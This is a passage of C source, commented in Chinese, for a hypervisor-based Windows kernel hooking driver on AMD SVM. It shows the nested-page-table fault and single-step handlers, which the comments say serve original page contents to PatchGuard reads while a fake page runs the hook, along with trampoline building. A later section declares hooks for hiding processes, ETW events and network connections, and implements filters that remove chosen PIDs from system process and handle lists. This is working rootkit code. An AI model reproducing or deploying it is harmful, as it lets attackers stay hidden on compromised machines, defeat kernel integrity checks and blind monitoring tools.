    guestRip = VcpuData->Vmcb->StateSaveArea.Rip;
    
    // 检查 RIP 是否在同一页
    {
        ULONG64 ripPageVa = guestRip & PAGE_MASK;
        ULONG64 targetPageVa = (ULONG64)hookEntry->TargetVirtualAddress & PAGE_MASK;
        ripOnSamePage = (ripPageVa == targetPageVa);
    }
    
    // 记录
    currentNpf = InterlockedIncrement(&npfCount);
    // 注意：SVM root 模式下不要调用 DbgPrint，可能导致蓝屏
    
    InterlockedIncrement64(&hookEntry->HitCount);
    
    cpuIndex = KeGetCurrentProcessorNumber();
    if (cpuIndex >= 64) cpuIndex = 0;
    stepCtx = &g_NptHookManager.StepContext[cpuIndex];
    
    // 检查是否已有 pending 单步（使用原子操作）
    MemoryBarrier();
    if (InterlockedCompareExchange(&stepCtx->StepActive, 1, 1) == 1) {
        // 已有单步 pending —— 但 NPT entry 此时可能已被前一次 #DB exit
        // 改回限制状态。如果直接 return TRUE 不改 entry,guest 重试同一指令
        // 还是 NPF → 再进 handler → 还是 return TRUE → 死循环在 handler 内部
        // (对应 EptHook 2026-05-21 第六轮真元凶,SVM 侧同病同治)。
        // 修复:无论何种 violation 都临时开 RWX,让 guest 至少能跑过这条指令。
        PNPT_PTE pte = NptGetPteForPhysicalAddress(VcpuData, hookEntry->TargetPhysicalAddress);
        if (pte) {
            pte->Present = 1;
            pte->Write = 1;
            pte->NoExecute = 0;
            NptInvalidateTlb(VcpuData);
        }
        return TRUE;
    }
    
    /*
     * AMD NPT Hook 策略：
     * 
     * 正常状态：NPT 指向 FakePage (P=1, W=1, NX=0)
     * - 执行时：直接执行 FakePage 上的 JMP，跳转到 Hook 函数
     * - 不会触发 NPF（因为允许执行）
     * 
     * 当读取触发 NPF 时（PatchGuard 检查）：
     * - 临时切换到 OriginalPage 让读取返回原始代码
     * - 使用单步 (#DB) 在读取完成后恢复到 FakePage
     * 
     * 注意：由于 AMD NPT 不支持 Execute-Only，
     * 我们的策略是让 FakePage 可执行，
     * 只在需要时临时显示 OriginalPage
     */
    
    if (isFetch) {
        // 指令获取 - 不应该发生（FakePage 应该可执行）
        // 可能是 TLB 不同步，恢复到 FakePage
        if (currentNpf <= 5) {
            DbgPrint("[NPT-Hook] Unexpected fetch NPF - restoring FakePage\n");
        }
        NptSwitchToFakePage(VcpuData, hookEntry);
    }
    else if (isWrite || (!isFetch && !isWrite)) {
        // 读取或写入 - 需要显示原始代码
        
        if (ripOnSamePage) {
            // RIP 在同一页 - 代码正在执行并读取数据
            // 临时开放所有权限到 FakePage
            PNPT_PTE pte = NptGetPteForPhysicalAddress(VcpuData, hookEntry->TargetPhysicalAddress);
            if (pte) {
                pte->PageFrameNumber = hookEntry->FakePagePhysical >> 12;
                pte->Present = 1;
                pte->Write = 1;
                pte->NoExecute = 0;
                NptInvalidateTlb(VcpuData);
            }
        }
        else {
            // RIP 不在同一页 - 外部代码读取（可能是 PatchGuard）
            // 切换到 OriginalPage
            NptSwitchToOriginalPage(VcpuData, hookEntry);
            
            // 设置单步以便恢复（使用原子操作）
            stepCtx->PendingHookEntry = hookEntry;
            MemoryBarrier();
            InterlockedExchange(&stepCtx->StepActive, 1);
            NptEnableSingleStep(VcpuData);
        }
    }
    
    return TRUE;
}

/*
 * 处理单步执行后恢复
 */
BOOLEAN
NptHookHandleSingleStep(
    _In_ PVCPU_DATA VcpuData
)
{
    ULONG cpuIndex;
    PNPT_STEP_CONTEXT stepCtx;
    PNPT_HOOK_ENTRY hookEntry;
    static volatile LONG stepCount = 0;
    LONG currentStep;
    
    cpuIndex = KeGetCurrentProcessorNumber();
    if (cpuIndex >= 64) cpuIndex = 0;
    stepCtx = &g_NptHookManager.StepContext[cpuIndex];
    
    // 检查并原子清除单步状态
    if (InterlockedCompareExchange(&stepCtx->StepActive, 0, 1) != 1) {
        NptDisableSingleStep(VcpuData);
        return FALSE;
    }
    
    // 获取 hookEntry（StepActive 已被清除）
    MemoryBarrier();
    hookEntry = (PNPT_HOOK_ENTRY)stepCtx->PendingHookEntry;
    
    currentStep = InterlockedIncrement(&stepCount);
    
    // 清除 PendingHookEntry
    stepCtx->PendingHookEntry = NULL;
    MemoryBarrier();
    NptDisableSingleStep(VcpuData);
    
    // 验证 Hook 有效
    if (!hookEntry || hookEntry->State != NptHookStateActive) {
        return TRUE;
    }
    
    // 注意：SVM root 模式下不要调用 DbgPrint
    
    // 恢复到 FakePage
    NptSwitchToFakePage(VcpuData, hookEntry);
    
    return TRUE;
}

// ============================================================
// NPT 页切换
// ============================================================

static VOID
NptSwitchToFakePage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    PNPT_PTE pte;
    
    if (!HookEntry || HookEntry->State != NptHookStateActive) {
        return;
    }
    
    pte = NptGetPteForPhysicalAddress(VcpuData, HookEntry->TargetPhysicalAddress);
    if (!pte) {
        return;
    }
    
    // 指向 FakePage，允许执行
    pte->PageFrameNumber = HookEntry->FakePagePhysical >> 12;
    pte->Present = 1;
    pte->Write = 1;
    pte->NoExecute = 0;
    
    NptInvalidateTlb(VcpuData);
}

static VOID
NptSwitchToOriginalPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    PNPT_PTE pte;
    
    if (!HookEntry || HookEntry->State != NptHookStateActive) {
        return;
    }
    
    pte = NptGetPteForPhysicalAddress(VcpuData, HookEntry->TargetPhysicalAddress);
    if (!pte) {
        return;
    }
    
    // 指向原始页，允许读写但禁止执行
    pte->PageFrameNumber = HookEntry->TargetPhysicalAddress >> 12;
    pte->Present = 1;
    pte->Write = 1;
    pte->NoExecute = 1;  // 禁止执行（安全，因为 RIP 不在此页）
    
    NptInvalidateTlb(VcpuData);
}

// ============================================================
// 辅助函数
// ============================================================

PNPT_HOOK_ENTRY
NptHookFindByPhysicalAddress(
    _In_ ULONG64 PhysicalAddress
)
{
    PLIST_ENTRY entry;
    PNPT_HOOK_ENTRY hookEntry;
    ULONG64 pagePhysical = PhysicalAddress & PAGE_MASK;
    KIRQL oldIrql;
    
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    
    for (entry = g_NptHookManager.HookList.Flink;
         entry != &g_NptHookManager.HookList;
         entry = entry->Flink)
    {
        hookEntry = CONTAINING_RECORD(entry, NPT_HOOK_ENTRY, ListEntry);
        if (hookEntry->TargetPhysicalAddress == pagePhysical ||
            hookEntry->FakePagePhysical == pagePhysical) {
            KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
            return hookEntry;
        }
    }
    
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    return NULL;
}

static PNPT_HOOK_ENTRY
NptHookFindByPhysicalAddressNoLock(
    _In_ ULONG64 PhysicalAddress
)
{
    PLIST_ENTRY entry;
    PNPT_HOOK_ENTRY hookEntry;
    ULONG64 pagePhysical = PhysicalAddress & PAGE_MASK;
    
    for (entry = g_NptHookManager.HookList.Flink;
         entry != &g_NptHookManager.HookList;
         entry = entry->Flink)
    {
        hookEntry = CONTAINING_RECORD(entry, NPT_HOOK_ENTRY, ListEntry);
        if (hookEntry->TargetPhysicalAddress == pagePhysical ||
            hookEntry->FakePagePhysical == pagePhysical) {
            return hookEntry;
        }
    }
    
    return NULL;
}

PNPT_HOOK_ENTRY
NptHookFindByVirtualAddress(
    _In_ PVOID VirtualAddress
)
{
    PLIST_ENTRY entry;
    PNPT_HOOK_ENTRY hookEntry;
    KIRQL oldIrql;
    
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    
    for (entry = g_NptHookManager.HookList.Flink;
         entry != &g_NptHookManager.HookList;
         entry = entry->Flink)
    {
        hookEntry = CONTAINING_RECORD(entry, NPT_HOOK_ENTRY, ListEntry);
        if (hookEntry->TargetVirtualAddress == VirtualAddress) {
            KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
            return hookEntry;
        }
    }
    
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    return NULL;
}

PVOID
NptHookGetTrampoline(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    if (!HookEntry) {
        return NULL;
    }
    return HookEntry->TrampolineAddress;
}

// ============================================================
// 伪造页和跳板创建
// ============================================================

static NTSTATUS
NptCreateFakePage(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    PHYSICAL_ADDRESS maxAddr;
    PUCHAR targetPage;
    PUCHAR hookCode;
    
    maxAddr.QuadPart = -1LL;
    
    // 分配伪造页
    HookEntry->FakePageVirtual = MmAllocateContiguousMemory(PAGE_SIZE_4KB, maxAddr);
    if (!HookEntry->FakePageVirtual) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    HookEntry->FakePagePhysical = 
        MmGetPhysicalAddress(HookEntry->FakePageVirtual).QuadPart;
    
    // 复制原始页内容
    targetPage = (PUCHAR)((ULONG_PTR)HookEntry->TargetVirtualAddress & PAGE_MASK);
    RtlCopyMemory(HookEntry->FakePageVirtual, targetPage, PAGE_SIZE_4KB);
    
    // 写入 Hook 跳转代码
    // 2026-06-16: 镜像 EptHook 修复 — 单次原子写。
    hookCode = (PUCHAR)HookEntry->FakePageVirtual + HookEntry->OffsetInPage;
    {
        UCHAR jmpBuf[sizeof(NptJmpTemplate)];
        RtlCopyMemory(jmpBuf, NptJmpTemplate, 6);
        *(PVOID*)(jmpBuf + 6) = HookEntry->HookFunction;
        RtlCopyMemory(hookCode, jmpBuf, sizeof(jmpBuf));
    }
    
    DbgPrint("[NPT-Hook] Created fake page: VA=%p PA=0x%llx\n",
        HookEntry->FakePageVirtual, HookEntry->FakePagePhysical);
    
    return STATUS_SUCCESS;
}

/*
 * 创建跳板（用于调用原函数）
 *
 * 2026-06-16 方案 A 改写: 委派给共享重写器 HvHookRewriteTrampoline (镜像 EPT 路径)。
 *   - 旧 NptRelocateRelativeInstructions 整个删除。
 *   - 短跳扩 rel32, 后续指令偏移整体重算, RIP-relative disp32 按新 RIP 重算。
 *   - LOOPxx/JECXZ + 解码失败 + 距离 >2GB → 拒装。
 */
static NTSTATUS
NptCreateTrampoline(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    UCHAR scratch[128];
    HV_TRAMP_REWRITE_RESULT rr;
    PUCHAR trampoline;
    ULONG worstCase;
    ULONG worstAligned;
    ULONG actualSize;
    ULONG actualAligned;
#if !NPT_HOOK_SIMPLE_MODE
    NTSTATUS st;
#endif

    // ---- 阶段 A: 保守上界预约池空间, 但不 commit ----
    worstCase    = HookEntry->OriginalBytesLength * 3 + sizeof(NptJmpTemplate);
    worstAligned = (worstCase + 0x0F) & ~0x0FUL;

    if (g_NptHookManager.TrampolinePoolUsed + worstAligned > PAGE_SIZE_4KB * 4) {
        DbgPrint("[NPT-Hook] Trampoline pool exhausted (need worst-case %u aligned, have %u)\n",
                 worstAligned,
                 PAGE_SIZE_4KB * 4 - g_NptHookManager.TrampolinePoolUsed);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    trampoline = (PUCHAR)g_NptHookManager.TrampolinePool +
                 g_NptHookManager.TrampolinePoolUsed;

#if NPT_HOOK_SIMPLE_MODE
    {
        ULONG i;
        DbgPrint("[NPT-Hook] SIMPLE_MODE: skipping rewriter, direct copy %u bytes\n",
                 HookEntry->OriginalBytesLength);
        RtlCopyMemory(scratch, HookEntry->OriginalBytes, HookEntry->OriginalBytesLength);
        rr.DstLen = HookEntry->OriginalBytesLength;
        rr.InstCount = 0;
        for (i = 0; i < HV_TRAMP_MAX_INSTS; i++) {
            rr.OrigOffsets[i] = 0;
            rr.NewOffsets[i] = 0;
            rr.Types[i] = 0;
        }
    }
#else
    st = HvHookRewriteTrampoline(
        HookEntry->OriginalBytes,
        HookEntry->OriginalBytesLength,
        (ULONG_PTR)HookEntry->TargetVirtualAddress,
        scratch, sizeof(scratch),
        (ULONG_PTR)trampoline,
        &rr);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[NPT-Hook] HvHookRewriteTrampoline failed: 0x%X (srcLen=%u)\n",
                 st, HookEntry->OriginalBytesLength);
        return st;
    }
#endif

    // 拷到池
    RtlCopyMemory(trampoline, scratch, rr.DstLen);

    // 14 字节 jmp-back (本地缓冲单次写入)
    {
        UCHAR jmpBuf[sizeof(NptJmpTemplate)];
        RtlCopyMemory(jmpBuf, NptJmpTemplate, 6);
        *(PVOID*)(jmpBuf + 6) =
            (PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength;
        RtlCopyMemory(trampoline + rr.DstLen, jmpBuf, sizeof(jmpBuf));
    }

    // 阶段 B: commit 实际占用
    actualSize    = rr.DstLen + sizeof(NptJmpTemplate);
    actualAligned = (actualSize + 0x0F) & ~0x0FUL;
    g_NptHookManager.TrampolinePoolUsed += actualAligned;

    if (actualAligned > actualSize) {
        RtlFillMemory(trampoline + actualSize, actualAligned - actualSize, 0xCC);
    }

    HookEntry->TrampolineAddress     = trampoline;
    HookEntry->TrampolineWriteLength = rr.DstLen;
    HookEntry->TrampolineInstCount   = rr.InstCount;

    // ---- 完整 dump + 重写映射 ----
    DbgPrint("[NPT-Hook] Trampoline at %p (srcLen=%u dstLen=%u instCount=%u alignedSize=%u):\n",
             trampoline, HookEntry->OriginalBytesLength, rr.DstLen, rr.InstCount, actualAligned);
    {
        ULONG dumpLen = actualAligned + 16;
        if (dumpLen > 80) dumpLen = 80;
        for (ULONG dpi = 0; dpi < dumpLen; dpi += 16) {
            DbgPrint("[NPT-Hook]   +0x%02X: %02X %02X %02X %02X %02X %02X %02X %02X "
                     "%02X %02X %02X %02X %02X %02X %02X %02X\n",
                     dpi,
                     trampoline[dpi+0],  trampoline[dpi+1],  trampoline[dpi+2],  trampoline[dpi+3],
                     trampoline[dpi+4],  trampoline[dpi+5],  trampoline[dpi+6],  trampoline[dpi+7],
                     trampoline[dpi+8],  trampoline[dpi+9],  trampoline[dpi+10], trampoline[dpi+11],
                     trampoline[dpi+12], trampoline[dpi+13], trampoline[dpi+14], trampoline[dpi+15]);
        }
    }

#if !NPT_HOOK_SIMPLE_MODE
    {
        ULONG ri;
        for (ri = 0; ri < rr.InstCount; ri++) {
            DbgPrint("[NPT-Hook]   #%u orig+0x%02X -> new+0x%02X  type=%u\n",
                     ri, rr.OrigOffsets[ri], rr.NewOffsets[ri], rr.Types[ri]);
        }
    }
#endif

    // 自检
    {
        ULONG off = 0;
        ULONG step = 0;
        HV_INST_INFO info;
        BOOLEAN selfCheckOk = TRUE;
        while (off < rr.DstLen && step < HV_TRAMP_MAX_INSTS + 2) {
            if (!HvLdeDecode(trampoline + off, &info) || info.Length == 0) {
                DbgPrint("[NPT-Hook] *** SELF-CHECK FAIL *** decode failure at trampoline+0x%X "
                         "(byte 0x%02X)\n", off, trampoline[off]);
                selfCheckOk = FALSE;
                break;
            }
            off += info.Length;
            step++;
        }
        if (selfCheckOk && off != rr.DstLen) {
            DbgPrint("[NPT-Hook] *** SELF-CHECK FAIL *** instruction boundary mismatch: "
                     "decoded=%u expected=%u\n", off, rr.DstLen);
            selfCheckOk = FALSE;
        }
        if (selfCheckOk) {
            if (trampoline[rr.DstLen]     == 0xFF &&
                trampoline[rr.DstLen + 1] == 0x25 &&
                *(PVOID*)(trampoline + rr.DstLen + 6) ==
                    (PVOID)((PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength))
            {
                DbgPrint("[NPT-Hook] Self-check OK: %u instructions over %u bytes, jmp-back -> %p\n",
                         step, off,
                         (PVOID)((PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength));
            } else {
                DbgPrint("[NPT-Hook] *** SELF-CHECK FAIL *** jmp-back template wrong at +0x%X\n", rr.DstLen);
            }
        }
    }

    DbgPrint("[NPT-Hook]   Jump back to: %p\n",
        (PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength);

    return STATUS_SUCCESS;
}

// ============================================================
// NPT 权限修改
// ============================================================

NTSTATUS
NptModifyPagePermissions(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress,
    _In_ BOOLEAN Present,
    _In_ BOOLEAN Write,
    _In_ BOOLEAN NoExecute
)
{
    PNPT_PTE pte;
    
    pte = NptGetPteForPhysicalAddress(VcpuData, PhysicalAddress);
    if (!pte) {
        return STATUS_NOT_FOUND;
    }
    
    pte->Present = Present ? 1 : 0;
    pte->Write = Write ? 1 : 0;
    pte->NoExecute = NoExecute ? 1 : 0;
    
    NptInvalidateTlb(VcpuData);
    
    return STATUS_SUCCESS;
}

NTSTATUS
NptRemapPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 OriginalPhysical,
    _In_ ULONG64 NewPhysical,
    _In_ BOOLEAN Present,
    _In_ BOOLEAN Write,
    _In_ BOOLEAN NoExecute
)
{
    PNPT_PTE pte;
    
    pte = NptGetPteForPhysicalAddress(VcpuData, OriginalPhysical);
    if (!pte) {
        return STATUS_NOT_FOUND;
    }
    
    pte->PageFrameNumber = NewPhysical >> 12;
    pte->Present = Present ? 1 : 0;
    pte->Write = Write ? 1 : 0;
    pte->NoExecute = NoExecute ? 1 : 0;
    
    NptInvalidateTlb(VcpuData);
    
    return STATUS_SUCCESS;
}

// ============================================================
// 高级功能：进程隐藏
// ============================================================

// 原始函数类型
typedef NTSTATUS (NTAPI *PFN_NptNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// ZwQuerySystemInformation 声明
NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    _In_ ULONG SystemInformationClass,
    _Inout_opt_ PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);

static PFN_NptNtQuerySystemInformation g_NptOriginalNtQuerySystemInformation = NULL;
static PNPT_HOOK_ENTRY g_NptNtQuerySystemInformationHook = NULL;

// ============================================================
// SystemInformationClass 常量定义
// ============================================================
#define NptSystemProcessInformation            5
#define NptSystemHandleInformation             16
#define NptSystemSessionProcessInformation     53
#define NptSystemExtendedProcessInformation    57
#define NptSystemExtendedHandleInformation     64
#define NptSystemFullProcessInformation        148

// ============================================================
// NtGetNextProcess/NtGetNextThread Hook
// ============================================================
typedef NTSTATUS (NTAPI *PFN_NptNtGetNextProcess)(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
);

typedef NTSTATUS (NTAPI *PFN_NptNtGetNextThread)(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
);

static PFN_NptNtGetNextProcess g_NptOriginalNtGetNextProcess = NULL;
static PNPT_HOOK_ENTRY g_NptNtGetNextProcessHook = NULL;
static PFN_NptNtGetNextThread g_NptOriginalNtGetNextThread = NULL;
static PNPT_HOOK_ENTRY g_NptNtGetNextThreadHook = NULL;

// ============================================================
// NtOpenProcess Hook
// ============================================================
typedef NTSTATUS (NTAPI *PFN_NptNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

static PFN_NptNtOpenProcess g_NptOriginalNtOpenProcess = NULL;
static PNPT_HOOK_ENTRY g_NptNtOpenProcessHook = NULL;

// ============================================================
// ETW Hook
// ============================================================
// EtwWrite 真实原型：5 个参数（不是 4 个！）
typedef NTSTATUS (NTAPI *PFN_NptEtwWrite)(
    PVOID   RegHandle,
    PVOID   EventDescriptor,
    LPCGUID ActivityId,
    ULONG   UserDataCount,
    PVOID   UserData
);

static PFN_NptEtwWrite g_NptOriginalEtwWrite = NULL;
static PNPT_HOOK_ENTRY g_NptEtwWriteHook = NULL;

// ETW Event IDs
#define NPT_ETW_PROCESS_START_EVENT_ID   1
#define NPT_ETW_PROCESS_STOP_EVENT_ID    2
#define NPT_ETW_THREAD_START_EVENT_ID    3
#define NPT_ETW_THREAD_STOP_EVENT_ID     4

typedef struct _NPT_EVENT_DESCRIPTOR {
    USHORT Id;
    UCHAR  Version;
    UCHAR  Channel;
    UCHAR  Level;
    UCHAR  Opcode;
    USHORT Task;
    ULONGLONG Keyword;
} NPT_EVENT_DESCRIPTOR, *PNPT_EVENT_DESCRIPTOR;

typedef struct _NPT_EVENT_DATA_DESCRIPTOR {
    ULONGLONG Ptr;
    ULONG Size;
    ULONG Reserved;
} NPT_EVENT_DATA_DESCRIPTOR, *PNPT_EVENT_DATA_DESCRIPTOR;

// ============================================================
// 网络连接隐藏 Hook
// ============================================================

typedef NTSTATUS (NTAPI *PFN_NptNtDeviceIoControlFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
);

static PFN_NptNtDeviceIoControlFile g_NptOriginalNtDeviceIoControlFile = NULL;
static PNPT_HOOK_ENTRY g_NptNtDeviceIoControlFileHook = NULL;

// MIB_TCPROW_OWNER_PID 结构
typedef struct _NPT_MIB_TCPROW_OWNER_PID {
    ULONG dwState;
    ULONG dwLocalAddr;
    ULONG dwLocalPort;
    ULONG dwRemoteAddr;
    ULONG dwRemotePort;
    ULONG dwOwningPid;
} NPT_MIB_TCPROW_OWNER_PID, *PNPT_MIB_TCPROW_OWNER_PID;

typedef struct _NPT_MIB_TCPTABLE_OWNER_PID {
    ULONG dwNumEntries;
    NPT_MIB_TCPROW_OWNER_PID table[1];
} NPT_MIB_TCPTABLE_OWNER_PID, *PNPT_MIB_TCPTABLE_OWNER_PID;

typedef struct _NPT_MIB_UDPROW_OWNER_PID {
    ULONG dwLocalAddr;
    ULONG dwLocalPort;
    ULONG dwOwningPid;
} NPT_MIB_UDPROW_OWNER_PID, *PNPT_MIB_UDPROW_OWNER_PID;

typedef struct _NPT_MIB_UDPTABLE_OWNER_PID {
    ULONG dwNumEntries;
    NPT_MIB_UDPROW_OWNER_PID table[1];
} NPT_MIB_UDPTABLE_OWNER_PID, *PNPT_MIB_UDPTABLE_OWNER_PID;

// SYSTEM_PROCESS_INFORMATION 结构
typedef struct _NPT_SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
} NPT_SYSTEM_PROCESS_INFO, *PNPT_SYSTEM_PROCESS_INFO;

// SYSTEM_HANDLE_TABLE_ENTRY_INFO 结构
typedef struct _NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PNPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _NPT_SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} NPT_SYSTEM_HANDLE_INFORMATION, *PNPT_SYSTEM_HANDLE_INFORMATION;

typedef struct _NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PNPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _NPT_SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} NPT_SYSTEM_HANDLE_INFORMATION_EX, *PNPT_SYSTEM_HANDLE_INFORMATION_EX;

typedef struct _NPT_SYSTEM_SESSION_PROCESS_INFORMATION {
    ULONG SessionId;
    ULONG SizeOfBuf;
    PVOID Buffer;
} NPT_SYSTEM_SESSION_PROCESS_INFORMATION, *PNPT_SYSTEM_SESSION_PROCESS_INFORMATION;

static BOOLEAN NptIsProcessHidden(ULONG ProcessId)
{
    ULONG i;
    KIRQL oldIrql;
    BOOLEAN result = FALSE;
    
    KeAcquireSpinLock(&g_NptHiddenProcessLock, &oldIrql);
    
    for (i = 0; i < g_NptHiddenProcessCount && i < MAX_HIDDEN_PROCESSES; i++) {
        if (g_NptHiddenProcessIds[i] == ProcessId) {
            result = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHiddenProcessLock, oldIrql);
    
    return result;
}

static VOID NptAddHiddenProcess(ULONG ProcessId)
{
    KIRQL oldIrql;
    ULONG i;
    
    if (ProcessId == 0 || ProcessId == 4) {
        return;
    }
    
    KeAcquireSpinLock(&g_NptHiddenProcessLock, &oldIrql);
    
    if (g_NptHiddenProcessCount < MAX_HIDDEN_PROCESSES) {
        for (i = 0; i < g_NptHiddenProcessCount; i++) {
            if (g_NptHiddenProcessIds[i] == ProcessId) {
                KeReleaseSpinLock(&g_NptHiddenProcessLock, oldIrql);
                return;
            }
        }
        g_NptHiddenProcessIds[g_NptHiddenProcessCount++] = ProcessId;
        DbgPrint("[NPT-Hook] Added hidden process: PID=%d\n", ProcessId);
    }
    
    KeReleaseSpinLock(&g_NptHiddenProcessLock, oldIrql);
}

static VOID NptFilterProcessList(PVOID SystemInformation)
{
    PNPT_SYSTEM_PROCESS_INFO current;
    PNPT_SYSTEM_PROCESS_INFO previous = NULL;
    ULONG hiddenCount = 0;
    ULONG iterationCount = 0;
    
    if (!SystemInformation || g_NptHiddenProcessCount == 0) {
        return;
    }
    
    __try {
        current = (PNPT_SYSTEM_PROCESS_INFO)SystemInformation;
        
        while (iterationCount < 10000) {
            ULONG processId;
            ULONG nextOffset;
            
            iterationCount++;
            
            __try {
                processId = (ULONG)(ULONG_PTR)current->UniqueProcessId;
                nextOffset = current->NextEntryOffset;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                break;
            }
            
            if (nextOffset > 0x100000 && nextOffset != 0) {
                break;
            }
            
            if (NptIsProcessHidden(processId)) {
                hiddenCount++;
                
                if (previous != NULL) {
                    __try {
                        if (nextOffset == 0) {
                            previous->NextEntryOffset = 0;
                        }
                        else {
                            previous->NextEntryOffset += nextOffset;
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) {
                        break;
                    }
                    
                    if (nextOffset == 0) break;
                    current = (PNPT_SYSTEM_PROCESS_INFO)((PUCHAR)current + nextOffset);
                    continue;
                }
            }
            
            previous = current;
            
            if (nextOffset == 0) break;
            current = (PNPT_SYSTEM_PROCESS_INFO)((PUCHAR)current + nextOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[NPT-Hook] Exception in FilterProcessList\n");
    }
}

/*
 * 过滤句柄列表 (SystemHandleInformation, class=16)
 */
static VOID NptFilterHandleList(PVOID SystemInformation, ULONG SystemInformationLength)
{
    PNPT_SYSTEM_HANDLE_INFORMATION handleInfo;
    ULONG i, j;
    
    if (!SystemInformation || SystemInformationLength < sizeof(NPT_SYSTEM_HANDLE_INFORMATION)) {
        return;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return;
    }
    
    __try {
        handleInfo = (PNPT_SYSTEM_HANDLE_INFORMATION)SystemInformation;
        
        j = 0;
        for (i = 0; i < handleInfo->NumberOfHandles; i++) {
            USHORT processId = handleInfo->Handles[i].UniqueProcessId;
            
            if (!NptIsProcessHidden((ULONG)processId)) {
                if (i != j) {
                    RtlCopyMemory(&handleInfo->Handles[j],
                                  &handleInfo->Handles[i],
                                  sizeof(NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO));
                }
                j++;
            }
        }
        
        handleInfo->NumberOfHandles = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 过滤扩展句柄列表 (SystemExtendedHandleInformation, class=64)
 */
static VOID NptFilterExtendedHandleList(PVOID SystemInformation, ULONG SystemInformationLength)
{
    PNPT_SYSTEM_HANDLE_INFORMATION_EX handleInfo;
    ULONG_PTR i, j;
    
    if (!SystemInformation || SystemInformationLength < sizeof(NPT_SYSTEM_HANDLE_INFORMATION_EX)) {
        return;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return;
    }
    
    __try {
        handleInfo = (PNPT_SYSTEM_HANDLE_INFORMATION_EX)SystemInformation;
        
        j = 0;
        for (i = 0; i < handleInfo->NumberOfHandles; i++) {
